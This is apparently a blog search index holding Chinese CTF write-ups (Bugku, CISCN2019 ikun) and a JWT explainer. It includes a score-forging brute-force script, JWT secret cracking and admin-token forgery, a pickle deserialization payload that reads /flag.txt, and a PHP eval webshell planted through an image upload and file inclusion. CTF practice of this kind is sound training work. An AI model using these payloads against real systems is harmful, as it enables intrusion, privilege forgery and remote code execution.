<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bugku Game1</title>
    <url>/2021/05/11/Bugku-Game1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Game1"><a href="#Bugku-Game1" class="headerlink" title="Bugku Game1"></a>Bugku Game1</h1><h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，进去是一个游戏，先玩一下，是个盖楼游戏</p>
<p><img src="https://i.loli.net/2021/05/11/9ZFMYQcfzmRltqd.png" alt="2.png"></p>
<p>然后查看源代码，发现下面这几句话，有一个score.php,是用来提交分数的，看到这里就不难猜到应该是分数过了某个分数就会拿到flag，这里面有三个参数，看起来分别是分数、ip以及分数的base64编码，这里随便试一下，分数先搞一个6666，然后ip就是源码里的，sign就是编码NjY2Ngo=，构造输入<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=NjY2Ngo=</code>，发现返回失败了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ppp=<span class="string">&#x27;111.33.78.4&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> sign = Base64.encode(score.toString());</span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;score.php?score=&quot;</span>+score+<span class="string">&quot;&amp;ip=&quot;</span>+ppp+<span class="string">&quot;&amp;sign=&quot;</span>+sign,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
<h2 id="上burp"><a href="#上burp" class="headerlink" title="上burp"></a>上burp</h2><p>这里我以为是输入不够大，就试了更大的数，发现还是不对，然后随便玩了下游戏，用burp抓包，看一下发送到score.php的数据包，发现score和ip都和我们的形式一样，但是sign却不是25的base64编码，25的base64编码是MjU=，数据包里是zMMjU===，再尝试一下其他分数发现都是’zM’+base64(score)+’==’，所以可能是输入构造错了</p>
<p><img src="https://i.loli.net/2021/05/11/jQdIAX7tmhfuK35.png" alt="3.png"></p>
<p>然后将上面构造的输入改为<code>http://114.67.246.176:19820/score.php?score=6666&amp;ip=111.33.78.4.54&amp;sign=zMNjY2Ngo===</code>，发现返回了flag，果然是因为输入的格式问题</p>
<p><img src="https://i.loli.net/2021/05/11/7RvHw3KTNhy62bC.png" alt="4.png"></p>
<h2 id="写个脚本"><a href="#写个脚本" class="headerlink" title="写个脚本"></a>写个脚本</h2><p>那么这个分数的阈值究竟是啥，我们写个脚本来跑一下，这里从1000开始是因为我自己玩到了1000多分还是失败了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19820/score.php?score=&quot;</span></span><br><span class="line">url2=<span class="string">&quot;&amp;ip=111.33.78.4&amp;sign=zM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1000</span>,<span class="number">100000</span>):</span><br><span class="line">    i=<span class="built_in">str</span>(i)</span><br><span class="line">    j=b64encode(i.encode())</span><br><span class="line">    j=j.decode()</span><br><span class="line">    r=requests.get(url+i+url2+j+<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;失败了&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后发现到3000就出flag了</p>
<p><img src="https://i.loli.net/2021/05/11/ZXNY1wpIJfvCdyx.png" alt="1.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>iKun</title>
    <url>/2021/05/08/ikun/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><blockquote>
<p>只因你太美</p>
</blockquote>
<h2 id="先瞅瞅"><a href="#先瞅瞅" class="headerlink" title="先瞅瞅"></a>先瞅瞅</h2><p>打开环境，开幕雷击，鸡你太美！<br><img src="https://i.loli.net/2021/05/08/9DWou4F5XmjpLKZ.png" alt="1.png"></p>
<h2 id="再试试"><a href="#再试试" class="headerlink" title="再试试"></a>再试试</h2><p>先注册登录，盲猜会用到admin账号，尝试注册admin+空格 ,失败了，只能随便注册一下，登陆后看到左下角的一定要抢到lv6，往下滑，发现每个商品都会有一lv的标签，发现lv标签与商品图片是两个图片，也就是说可以编写脚本查找lv6.png<br><img src="https://i.loli.net/2021/05/08/Sw2uRiLjQW4UpbB.png" alt="2.png"></p>
<p>脚本如下,得到结果为181，因此lv6在第181页，进入到第181页，找到对应商品购买，发现钱不够</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://6ec470a9-5d1d-4d73-894c-1364a0178d28.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500</span>):</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/08/cUdGtBvIMKqFWhL.png" alt="3.png"></p>
<p>看到了莫名其妙的优惠券，可能有文章，点击购买，用burp抓包，果然看到了折扣，偷偷修改为很小的数。弹出来的网页显示只能是admin才能访问，果然。<br><img src="https://i.loli.net/2021/05/08/bCxrczHuT1dogSE.png" alt="1.png"><br><img src="https://i.loli.net/2021/05/08/sRyor7zqmU8ObKc.png" alt="2.png"></p>
<p>再观察抓到的包，使用了JWT，用jwt.io解码看看，看到了我们的用户名a，然后可以使用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>进行爆破<br><img src="https://i.loli.net/2021/05/08/71Wo9JkOIspElBg.png" alt="1.png"></p>
<p>使用c-jwt-cracker的时候，先从GitHub下载代码，之后如果没有下载过openssl则先执行<code>sudo apt-get install libssl-dev</code>下载，之后在文件目录中执行<code>make</code>,用生成的可执行文件来进行爆破，可以得到secret为1Kun<br><img src="https://i.loli.net/2021/05/08/DvioVJIRMGfnyTQ.png" alt="2.png"></p>
<p>之后用jwt.io生成我们需要的jwt，将username设置为admin<br><img src="https://i.loli.net/2021/05/08/OY8CjLv1xNVWdTw.png" alt="3.png"></p>
<p>替换掉原来的jwt，就可以解锁新界面，除了利用burp，还可以直接打开浏览器的控制台，直接修改也可以<br><img src="https://i.loli.net/2021/05/08/Oiph9m8CE7WqMgA.png" alt="1.png"><br>查看网页源代码，发现了一个链接，点击下载网站的源代码，开始分析<br><img src="https://i.loli.net/2021/05/08/RgslpFaHuIO4J8G.png" alt="2.png"><br>在sshop/views/Admin.py中找到了一个反序列化点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造payload获得flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>
<p>运行的结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
<p>将become的内容改为上面得到的序列，然后获得flag<br><img src="https://i.loli.net/2021/05/08/V2FKLk69Z78nuhI.png" alt="3.png"><br>或者直接在浏览器控制台修改也能得到flag，首先将become的hiden属性删除，就会发现出现一个输入框，输入刚才得到的序列得到flag<br><img src="https://i.loli.net/2021/05/08/o47cgzqipPJdBZU.png" alt="2.png"><br><img src="https://i.loli.net/2021/05/08/hmldG8Pn7zKW1c2.png" alt="3.png"><br><img src="https://i.loli.net/2021/05/08/dI9FLKf7MR1zcau.png" alt="4.png"></p>
<h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p> Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com/?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<p>说起JWT，我们应该来谈一谈基于token的认证和传统的session认证的区别。</p>
<p>我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。</p>
<p>但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来.</p>
<p><strong>Session</strong>: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。</p>
<p><strong>扩展性</strong>: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。</p>
<p><strong>CSRF</strong>: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。</p>
<h2 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h2><p>基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
<p>流程上是这样的：</p>
<ul>
<li>用户使用用户名密码来请求服务器</li>
<li>服务器进行验证用户的信息</li>
<li>服务器通过验证发送给用户一个token</li>
<li>客户端存储token，并在每次请求时附送上这个token值</li>
<li>服务端验证token值，并返回数据</li>
</ul>
<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持 <code>CORS(&amp;#x8DE8;&amp;#x6765;&amp;#x6E90;&amp;#x8D44;&amp;#x6E90;&amp;#x5171;&amp;#x4EAB;)</code>策略，一般我们在服务端这么做就可以了 <code>Access-Control-Allow-Origin: *</code>。</p>
<p>那么我们现在回到JWT的主题上。</p>
<h3 id="JWT长什么样？"><a href="#JWT长什么样？" class="headerlink" title="JWT长什么样？"></a>JWT长什么样？</h3><p>JWT是由三段信息构成的，将这三段信息文本用 <code>.</code>链接一起就构成了Jwt字符串。就像这样:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>

<h3 id="JWT的构成"><a href="#JWT的构成" class="headerlink" title="JWT的构成"></a>JWT的构成</h3><p>第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature).</p>
<p>jwt的头部承载两部分信息：</p>
<ul>
<li>声明类型，这里是jwt</li>
<li>声明加密的算法 通常直接使用 HMAC SHA256</li>
</ul>
<p>完整的头部就像下面这样的JSON：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#39;typ&#39;: &#39;JWT&#39;,</span><br><span class="line">  &#39;alg&#39;: &#39;HS256&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>

<p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>标准中注册的声明</strong> (建议但不强制使用) ：</p>
<ul>
<li><p><strong>iss</strong>: jwt签发者</p>
</li>
<li><p><strong>sub</strong>: jwt所面向的用户</p>
</li>
<li><p><strong>aud</strong>: 接收jwt的一方</p>
</li>
<li><p><strong>exp</strong>: jwt的过期时间，这个过期时间必须要大于签发时间</p>
</li>
<li><p><strong>nbf</strong>: 定义在什么时间之前，该jwt都是不可用的.</p>
</li>
<li><p><strong>iat</strong>: jwt的签发时间</p>
</li>
<li><p><strong>jti</strong>: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。</p>
</li>
</ul>
<p><strong>公共的声明</strong> ：<br>公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.</p>
<p><strong>私有的声明</strong> ：<br>私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p>
<p>定义一个payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后将其进行base64加密，得到Jwt的第二部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>

<p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p>
<ul>
<li>header (base64后的)</li>
<li>payload (base64后的)</li>
<li>secret</li>
</ul>
<p>这个部分需要base64加密后的header和base64加密后的payload使用 <code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐 <code>secret</code>组合加密，然后就构成了jwt的第三部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javascript</span><br><span class="line">var encodedString &#x3D; base64UrlEncode(header) + &#39;.&#39; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature &#x3D; HMACSHA256(encodedString, &#39;secret&#39;); &#x2F;&#x2F; TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>

<p>将这三部分用 <code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>

<p><strong>注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</strong></p>
<p>一般是在请求头里加入 <code>Authorization</code>，并加上 <code>Bearer</code>标注：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch(&#39;api&#x2F;user&#x2F;1&#39;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#39;Authorization&#39;: &#39;Bearer &#39; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>服务端会验证token，如果验证通过就会返回相应的资源。整个流程就是这样的:</p>
<ul>
<li><p>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。</p>
</li>
<li><p>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。</p>
</li>
<li><p>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。</p>
</li>
<li><p>它不需要在服务端保存会话信息, 所以它易于应用的扩展</p>
</li>
<li><p>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。</p>
</li>
<li><p>保护好secret私钥，该私钥非常重要。</p>
</li>
<li><p>如果可以，请使用https协议</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>2019Ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web33</title>
    <url>/2021/04/28/Bugku-Web33/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web33"><a href="#Bugku-Web33" class="headerlink" title="Bugku Web33"></a>Bugku Web33</h1><blockquote>
<p>描述：fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</p>
</blockquote>
<p>下载文件，是一段php代码，提示给的字符串应该就是flag加密后得到的字符串，现在需要对其解密，得到flag，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$data,$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">&#x27;ISCC&#x27;</span>); <span class="comment">#729623334f0aa2784a1599fd374c120d</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">    $mkey = <span class="string">&quot;729623334f0aa2784a1599fd374c120d&quot;</span>;</span><br><span class="line">    $klen = strlen($mkey);</span><br><span class="line">    $tmp = $str;</span><br><span class="line">    $tmp = base64_decode($tmp);  <span class="comment">// 对 base64 后的字符串 decode</span></span><br><span class="line">    $md_len = strlen($tmp); <span class="comment">//获取字符串长度</span></span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $char = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i &lt; $md_len;$i++) &#123;  <span class="comment">//  取二次加密用 key;</span></span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)  <span class="comment">// 数据长度是否超过 key 长度检测</span></span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        $char .= $mkey[$x];  <span class="comment">// 从 key 中取二次加密用 key</span></span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$md_len;$i++) &#123; <span class="comment">// 取偏移后密文数据</span></span><br><span class="line">        array_push($md_data, ord($tmp[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    $md_data_source = <span class="keyword">array</span>();</span><br><span class="line">    $data1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $data2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($md_data <span class="keyword">as</span> $key =&gt; $value) &#123; <span class="comment">// 对偏移后的密文数据进行还原</span></span><br><span class="line">        $i = $key;</span><br><span class="line">        <span class="keyword">if</span>($i &gt;= strlen($mkey)) &#123;$i = $i - strlen($mkey);&#125;</span><br><span class="line">        $dd = $value;</span><br><span class="line">        $od = ord($mkey[$i]);</span><br><span class="line">        array_push($md_data_source,$dd);</span><br><span class="line">        $data1 .= chr(($dd+<span class="number">128</span>)-$od);  <span class="comment">// 第一种可能, 余数+128-key 为回归数</span></span><br><span class="line">        $data2 .= chr($dd-$od);  <span class="comment">// 第二种可能, 余数直接-key 为回归数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt; &quot;</span>.$data1.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt; &quot;</span>.$data2.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str = <span class="string">&quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;</span>;</span><br><span class="line">decrypt($str);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web34</title>
    <url>/2021/04/28/Bugku-Web34/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web34"><a href="#Bugku-Web34" class="headerlink" title="Bugku Web34"></a>Bugku Web34</h1><blockquote>
<p>提示：文件包含</p>
</blockquote>
<p>&emsp;&emsp;进入环境，页面也没有什么特殊的地方，注意到URL中有filename，可能存在文件包含漏洞<br><img src="https://i.loli.net/2021/04/28/Z7GXlykMqLQ31d9.png" alt="3.png"></p>
<p>&emsp;&emsp;查看源代码，发现了upload.php，访问upload.php<br><img src="https://i.loli.net/2021/04/28/bEvD3iSZYg9epwF.png" alt="4.png"></p>
<p>&emsp;&emsp;发现了上传功能，尝试通过burpsuite修改上传马儿，发现只允许上传图片格式，不过存在文件包含漏洞，我们依然能够有办法让马儿跑，此时只需要让filename等于我们上传的图片被保存的名字也可以执行里面的马儿。写入一句话木马的时候发现直接写`<?php @eval($_POST['pass']); ?>，<?php ?>会被删除，换一种方式用script绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/28/mdWGCDFBHr3wTM1.png" alt="6.png"></p>
<p>&emsp;&emsp;蚁剑直接连接<code>http://114.67.246.176:12372/index.php?file=upload/202104280813155137.jpg</code>,然后打开虚拟终端，在根目录cat flag就可以获得flag</p>
<p><img src="https://i.loli.net/2021/04/28/shUgKbRLznikQt8.png" alt="5.png"></p>
<p><img src="https://i.loli.net/2021/04/28/QpJSMKsn28O7GEP.png" alt="2.png"></p>
<p><img src="https://i.loli.net/2021/04/28/k62vimMqDUrhGzB.png" alt="1.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web31</title>
    <url>/2021/04/28/Bugku-Web31/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Bugku-Web31"><a href="#Bugku-Web31" class="headerlink" title="Bugku Web31"></a>Bugku Web31</h1><blockquote>
<p>提示：好像需要管理员</p>
</blockquote>
<p>&emsp;&emsp;进来就是一个404<br><img src="https://i.loli.net/2021/04/28/iXSIzqwmAWcsyfR.png" alt="1.png"><br>&emsp;&emsp;御剑扫描发现robots.txt<br><img src="https://i.loli.net/2021/04/28/lWKLJzRFhQA4dNx.png" alt="2.png"><br>&emsp;&emsp;访问robots.txt看到resusl.php<br><img src="https://i.loli.net/2021/04/28/Z6ciQrAa4n78vGJ.png" alt="3.png"><br>&emsp;&emsp;访问resusl.php，发现需要传参x<br><img src="https://i.loli.net/2021/04/28/FqXZd9yv7KTDBmn.png" alt="4.png"><br>&emsp;&emsp;尝试admin，因为一直提示管理员，得到flag<br><img src="https://i.loli.net/2021/04/28/xDAuw1N4CvQ5tEP.png" alt="5.png"></p>
]]></content>
      <tags>
        <tag>Bugku Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku Web32</title>
    <url>/2021/04/28/Bugku-Web32/</url>
